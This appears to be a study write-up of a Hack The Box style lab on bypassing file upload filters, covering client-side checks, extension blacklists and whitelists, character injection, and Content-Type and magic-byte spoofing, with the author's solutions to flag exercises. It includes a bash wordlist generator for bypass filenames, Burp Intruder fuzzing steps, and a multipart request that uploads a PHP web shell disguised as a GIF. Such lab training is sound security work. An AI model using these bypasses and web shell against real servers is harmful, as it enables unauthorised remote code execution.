# Bypassing Filters

## Client-Side Validation

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

When we get the file selection dialog, we cannot see our `PHP` scripts (or it may be greyed out), as the dialog appears to be limited to image formats only:

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

We may still select the `All Files` option to select our `PHP` script anyway, but when we do so, we get an error message saying (`Only images are allowed!`), and the `Upload` button gets disabled:

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

As mentioned earlier, to bypass these protections, we can either `modify the upload request to the back-end server`, or we can `manipulate the front-end code to disable these type validations`.

### Back-end Request Modification

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

The web application appears to be sending a standard HTTP upload request to `/upload.php`

The two important parts in the request are `filename="HTB.png"` and the file content at the end of the request. If we modify the `filename` to `shell.php` and modify the content to the web shell we used in the previous section; we would be uploading a `PHP` web shell instead of an image.

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

> Note: We may also modify the `Content-Type` of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.

***

### Disabling Front-end Validation

To start, we can click \[`CTRL+SHIFT+C`] to toggle the browser's `Page Inspector`, and then click on the profile image, which is where we trigger the file selector for the upload form:

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

This will highlight the following HTML file input on line `18`:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

The more interesting part is `onchange="checkFile(this)"`, which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

To do so, we can go back to our inspector, click on the profile image again, double-click on the function name (`checkFile`) on line `18`, and delete it:

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> Tip: You may also do the same to remove `accept=".jpg,.jpeg,.png"`, which should make selecting the `PHP` shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.

***

### PoCs - Questions

* Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)

First I try to upload a basic shell, but it give us an error -->

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I make a test.png example and intecept the peticion with burp -->

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt="" width="428"><figcaption></figcaption></figure>

Now, modifique the peticion and upload a basic php webshell -->

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

With it, i know that this ws.php will save, but i dont know, who is the direcction to target. Doing a little more research, i found into the source code the route of profile images -->

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Blacklist Filters Extensions

There are generally two common forms of validating a file extension on the back-end:

1. Testing against a `blacklist` of types
2. Testing against a `whitelist` of types

For example, the following piece of code checks if the uploaded file extension is `PHP` and drops the request if it is:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

***

### Fuzzing Extensions

There are many lists of extensions we can utilize in our fuzzing scan. `PayloadsAllTheThings` provides lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications. We may also use `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).

We may use any of the above lists for our fuzzing scan. As we are testing a PHP application, we will download and use the above [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) list. Then, from `Burp History`, we can locate our last request to `/upload.php`, right-click on it, and select `Send to Intruder`. From the `Positions` tab, we can `Clear` any automatically set positions, and then select the `.php` extension in `filename="HTB.php"` and click the `Add` button to add it as a fuzzing position:

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

We can sort the results by `Length`, and we will see that all requests with the Content-Length (`193`) passed the extension validation, as they all responded with `File successfully uploaded`.

***

### Non-Blacklisted Extensions

Now, we can try uploading a file using any of the `allowed extensions` from above, and some of them may allow us to execute PHP code. `Not all extensions will work with all web server configurations`, so we may need to try several extensions to get one that successfully executes PHP code.

Let's use the `.phtml` extension, which PHP web servers often allow for code execution rights. We can right-click on its request in the Intruder results and select `Send to Repeater`.

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

***

### PoCs - Questions

* Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

I try to modificate and input .php extension but it extions is not allowed, try tu fuzz extension until the right one is found -->

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

***

## Whitelisting Extensions

We see that we get a message saying `Only images are allowed`, which may be more common in web apps than seeing a blocked extension type

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

We can see that all variations of PHP extensions are blocked (e.g. `php5`, `php7`, `phtml`).&#x20;

The following is an example of a file extension whitelist test:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

### Double Extensions

For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.

Exercise: Try to fuzz the upload form with [This Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) to find what extensions are whitelisted by the upload form.

Let's intercept a normal upload request, and modify the file name to (`shell.jpg.php`), and modify its content to that of a web shell:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### Reverse Double Extension

For example, the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` web server may include the following configuration:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches `.phar`, `.php`, and `.phtml`

For example, the file name (`shell.php.jpg`) should pass the earlier whitelist test as it ends with (`.jpg`), and it would be able to execute PHP code due to the above misconfiguration, as it contains (`.php`) in its name.

> Exercise: The web application may still utilize a blacklist to deny requests containing `PHP` extensions. Try to fuzz the upload form with the [PHP Wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) to find what extensions are blacklisted by the upload form.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

***

### Character Injection

The following are some of the characters we may try injecting:

* `%20`
* `%0a`
* `%00`
* `%0d0a`
* `/`
* `.\`
* `.`
* `…`
* `:`

For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`)

We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

***

### PoCs - Questios

* The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

In this case y try with a simple double extensions (jpg.php) but nothing... so, i do it in reverse: (.php.jpg) and error expose, "no valid extension" so, i try with (.phar.jpg)

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

***

## Type Filters

There are two common methods for validating the file content: `Content-Type Header` or `File Content`&#x20;

### Content-Type

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see that we get a message saying `Only images are allowed`. The error message persists, and our file fails to upload even if we try some of the tricks we learned in the previous sections. If we change the file name to `shell.jpg.phtml` or `shell.php.jpg`, or even if we use `shell.jpg` with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the `Content-Type Header` or the `File Content`.

We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) through Burp Intruder

```shell-session
eldeim@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
eldeim@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

For the sake of simplicity, let's just pick an image type (e.g. `image/jpg`), then intercept our upload request and change the Content-Type header to it:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This time we get `File successfully uploaded`

***

### MIME-Type

This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

> Tip: Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.

#### Example

```bash
eldeim@htb[/htb]$ echo "this is a text file" > text.jpg 
eldeim@htb[/htb]$ file text.jpg 
text.jpg: ASCII text
```

As we see, the file's MIME type is `ASCII text`, even though its extension is `.jpg`. However, if we write `GIF8` to the beginning of the file, it will be considered as a `GIF` image instead, even though its extension is still `.jpg`:

```shell-session
eldeim@htb[/htb]$ echo "GIF8" > text.jpg 
eldeim@htb[/htb]$file text.jpg
text.jpg: GIF image data
```

As we can see, the MIME types are similar to the ones found in the Content-Type headers, but their source is different, as PHP uses the `mime_content_type()`

`Only images are allowed`. Now, let's try to add `GIF8` before our PHP code to try to imitate a GIF image while keeping our file extension as `.php`, so it would execute PHP code regardless:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This time we get `File successfully uploaded`, and our file is successfully uploaded to the server

We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on.&#x20;

***

### PoCs - Questions

* The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

First i analice the code of upload and i can see the frontend validation. Delete it -->&#x20;

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

> onchange = empty & accept = \* (all)

Then update a profile image of example, image.jpg and intercept this peticion with burpsuite -->

**Without drop the first request!** We send the peticion to the repeater:&#x20;

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

And now, I modifcate the peticion to look something like this -->&#x20;

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Now, we need to test all casuistries with intruder!!! There are 3 camps -->

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

For the first camp, the extensions, we need create a personalice diccionary with this script:

```
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phtml' '.phar'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

> We can add more extension, example: php4, etc...

Then, for the second, we need to have the content type diccionary -->

```
eldeim@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
eldeim@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

For the end, the three camp, we need contemplate the most popural magics numbers -->

<pre><code><strong>GIF8
</strong>GIF87a
GIF89a
ÿØÿà
ÿØÿî
ÿØÿÛ
</code></pre>

With it, we can use the Cluster Bomb attack with intruder and configurate all casuistries and attack, important then, configurate into settings > grep-extract a filter -->

```
-----------------------------353231978911704809013224416258
Content-Disposition: form-data; name="uploadFile"; filename="ws.jpg.phtml%20"
Content-Type: image/jpeg

GIF8
<?php system($_GET['cmd']); ?>
-----------------------------353231978911704809013224416258--
```
